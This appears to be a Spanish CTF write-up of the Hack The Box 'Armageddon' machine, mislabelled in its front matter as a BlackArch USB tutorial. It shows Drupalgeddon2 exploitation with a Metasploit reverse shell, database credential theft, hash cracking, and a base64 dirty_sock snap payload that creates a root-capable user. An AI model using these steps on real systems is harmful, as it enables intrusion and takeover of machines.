---
title: Como instalar BlackArch en USB! 
description: Tutorial para instalar BlackArch en USB con persisntencia
categories: [tutorial,hacking]
tags: [archlinux]
pin: true
image: /assets/img/Anexos/IMG_0439.png
comments: true
---

![](/assets/img/Anexos/Pasted%20image%2020250318104150-1.png)

## Reconocimiento
Empiezo el reconocimiento con un escaneo de `nmap` bastante completo: 
```shell
❯ nmap -p- -sSCV --min-rate=5000 -Pn -n 10.10.10.233 -oN nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 10:42 CET
Warning: 10.10.10.233 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.233
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to  Armageddon |  Armageddon
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-generator: Drupal 7 (http://drupal.org)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.82 seconds
```

El escaneo me reporta el puerto _22_ y el puerto _80_ abiertos. En el puertos _80_ además me reporta un **robots.txt**.

En la web tenemos este login:

![](/assets/img/Anexos/Pasted%20image%2020250318104332-1.png)

Usando `whatweb` nos reporta que estamos ante un drupal:
```shell
❯ whatweb http://10.10.10.233/
http://10.10.10.233/ [200 OK] Apache[2.4.6], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[10.10.10.233], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.16], PasswordField[pass], PoweredBy[Arnageddon], Script[text/javascript], Title[Welcome to  Armageddon |  Armageddon], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.4.16]

```

> En mi caso, droopscan estaba deprecated debido a la versión de python que tenía, por ello usé la herramienta `drupwn` 

```
❯ drupwn --mode enum --target http://10.10.10.233/
/usr/bin/drupwn:20: SyntaxWarning: invalid escape sequence '\_'
  print("""

        ____
       / __ \_______  ______ _      ______
      / / / / ___/ / / / __ \ | /| / / __ \
     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
    /_____/_/   \__,_/ .___/|__/|__/_/ /_/
                     /_/
    
[-] Version not specified, trying to identify it

[+] Version detected: 7.56


============ Nodes ============


============ Themes ============


============ Default files ============

[+] /README.txt (200)
[+] /robots.txt (200)
[+] /web.config (200)
[+] /xmlrpc.php (200)
[+] /install.php (200)
[+] /update.php (403)
[+] /LICENSE.txt (200)

============ Users ============


============ Modules ============

```
`drupwn` nos reporta la versión de Drupal, por ello busco en `searchsploit` y me encuentro con una vulnerabilidad por versiones debajo de la _8.6.9_ que permite RCE usando `metaesploit`:

![](/assets/img/Anexos/%20image%2020250318150827-1.png|756)

Por ello, ejecuto `metaesploit` y la busco con `search`:
```
msf6 > search drupal

Matching Modules
================

   #   Name                                                              Disclosure Date  Rank       Check  Description
   -   ----                                                              ---------------  ----       -----  -----------
   0   exploit/unix/webapp/drupal_coder_exec                             2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   1   exploit/unix/webapp/drupal_drupalgeddon2                          2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   2     \_ target: Automatic (PHP In-Memory)                            .                .          .      .
   3     \_ target: Automatic (PHP Dropper)                              .                .          .      .
   4     \_ target: Automatic (Unix In-Memory)                           .                .          .      .
   5     \_ target: Automatic (Linux Dropper)                            .                .          .      .
   6     \_ target: Drupal 7.x (PHP In-Memory)                           .                .          .      .
   7     \_ target: Drupal 7.x (PHP Dropper)                             .                .          .      .
   8     \_ target: Drupal 7.x (Unix In-Memory)                          .                .          .      .
   9     \_ target: Drupal 7.x (Linux Dropper)                           .                .          .      .
   10    \_ target: Drupal 8.x (PHP In-Memory)                           .                .          .      .
   11    \_ target: Drupal 8.x (PHP Dropper)                             .                .          .      .
   12    \_ target: Drupal 8.x (Unix In-Memory)                          .                .          .      .
   13    \_ target: Drupal 8.x (Linux Dropper)                           .                .          .      .
   14    \_ AKA: SA-CORE-2018-002                                        .                .          .      .
   15    \_ AKA: Drupalgeddon 2                                          .                .          .      .
   16  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   17    \_ target: Drupal 7.0 - 7.31 (form-cache PHP injection method)  .                .          .      .
   18    \_ target: Drupal 7.0 - 7.31 (user-post PHP injection method)   .                .          .      .
   19  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   20  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   21  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   22    \_ target: PHP In-Memory                                        .                .          .      .
   23    \_ target: Unix In-Memory                                       .                .          .      .
   24  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
```
Es la número 2, la selecciono con `use` y establezco los parámetros:
![](/assets/img/Anexos/Pasted%20image%2020250318150921-1.png)

![](/assets/img/Anexos/Pasted%20image%2020250318151055-1.png)
Ejecuto y logro una sesión de meterpreter, para estar más cómodo ejecuto `shell` para que me de una shell:
```shell
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (40004 bytes) to 10.10.10.233
[*] Meterpreter session 1 opened (10.10.14.6:4444 -> 10.10.10.233:48744) at 2025-03-18 15:11:09 +0100
shell

  
meterpreter > shell
Process 2942 created.
Channel 0 created.
id
whoami
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
apache
```

Dentro, a través del _/etc/passwd_ veo que hay un usuario llamado **brucetherealadmin**
```shell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

Investigando un poco, en _/var/www/html/sites/default_ encontré un _settings.php_ que contiene la contraseña de mysql:
![](/assets/img/Anexos/Pasted%20image%2020250318151902-1.png)

```shell
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
```

inicio sesión y estoy dentro:
```shell
mysql -u drupaluser -p
Enter password: CQHEy@9M*m23gBVj
```

> Al estar en una shell con `metasesploit`, no podía ejecutar comandos en MYSQL sin que me echará, por ello usé el parámetro `-e` para que lo ejecutará sin tener que estar ejecutan mysql: 

Listo las bases de datos:
```
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
Database
information_schema
drupal
mysql
performance_schema
```

Listo las tablas de la base de datos:
```shell
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show tables from drupal;'
Tables_in_drupal
actions
authmap
batch
block
block_custom
block_node_type
block_role
blocked_ips
cache
cache_block
cache_bootstrap
cache_field
cache_filter
cache_form
cache_image
cache_menu
cache_page
cache_path
comment
date_format_locale
date_format_type
date_formats
field_config
field_config_instance
field_data_body
field_data_comment_body
field_data_field_image
field_data_field_tags
field_revision_body
field_revision_comment_body
field_revision_field_image
field_revision_field_tags
file_managed
file_usage
filter
filter_format
flood
history
image_effects
image_styles
menu_custom
menu_links
menu_router
node
node_access
node_comment_statistics
node_revision
node_type
queue
rdf_mapping
registry
registry_file
role
role_permission
search_dataset
search_index
search_node_links
search_total
semaphore
sequences
sessions
shortcut_set
shortcut_set_users
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
taxonomy_vocabulary
url_alias
users
users_roles
variable
watchdog

```

Describo la tabla users:
```
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'describe drupal.users;' 
Field	Type	Null	Key	Default	Extra
uid	int(10) unsigned	NO	PRI	0	
name	varchar(60)	NO	UNI		
pass	varchar(128)	NO			
mail	varchar(254)	YES	MUL		
theme	varchar(255)	NO			
signature	varchar(255)	NO			
signature_format	varchar(255)	YES		NULL	
created	int(11)	NO	MUL	0	
access	int(11)	NO	MUL	0	
login	int(11)	NO		0	
status	tinyint(4)	NO		0	
timezone	varchar(32)	YES		NULL	
language	varchar(12)	NO			
picture	int(11)	NO	MUL	0	
init	varchar(254)	YES			
data	longblob	YES		NULL	

```

Listo la tabla users:
```
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'select name,pass from drupal.users;'
name	pass
	
brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

Tenemos la contraseña hasheada en drupal7:
```
❯  hashcat --help | grep Drupal
   7900 | Drupal7                                                    | Forums, CMS, E-Commerce
```

Por ello, paso la contraseña a un archivo llamado hash y con hashcat le aplico fuerza bruta: 

```
❯ echo "$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt" > hash
```

```
sudo hashcat -m 7900 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt 
```

Prácticamente al instante, me saca la contraseña:
```
❯ sudo cat cracked.txt
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
```
Al autenticarme como **brucetherealadmin** me da error ya que estoy con `metaesploit`, por ello mejor me conecto por ssh:
```
su **brucetherealadmin**
Password: booboo
su: System error
```

```
❯ ssh brucetherealadmin@10.10.10.233
The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
ED25519 key fingerprint is SHA256:rMsnEyZLB6x3S3t/2SFrEG1MnMxicQ0sVs9pFhjchIQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.233' (ED25519) to the list of known hosts.
brucetherealadmin@10.10.10.233's password: 
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$ 
```
Una vez dentro como el usuario **brucetherealadmin** vemos que estamos en el grupo sudoers y que podemos ejecutar como root y sin autenticarnos el siguiente.
![](/assets/img/Anexos/Pasted%20image%2020250318160435-1.png)


Para la escalada busqué en GTFObins pero no lo comprendía bien. Por ello me base en este git , solo en la parte en la que crea el paquete malicioso:

> https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py

Copio el paquete, lo decodifico y lo envio a un archivo llamado _package_
```
python -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4246 + "==")' | base64 -d > package
```

Ahora, en el mismo directorio donde esta el paquete, usamos `snap` para instalarlo indicándole las etiquetas `--dangerous` y `--devmode`:

![](/assets/img/Anexos/Pasted image 20250319091407-1.png)
Cuando este instalado, lo que habrá hecho es crear un usuario llamado **dirty_sock** con contraseña **dirty_sock** que esta en sudores y puede ejecutar TODO como cualquier usuario sin contraseña:
![](/assets/img/Anexos/Pasted%20image%2020250319091424-1.png)

![](/assets/img/Anexos/Pasted%20image%2020250319091514-1.png)

Por ello, simplemente me cambio a **root** y ni siquiera es necesario proporcionar contraseña:
![|651](/assets/img/Anexos/Pasted%20image%2020250319091557-1.png)
Y somos root!. 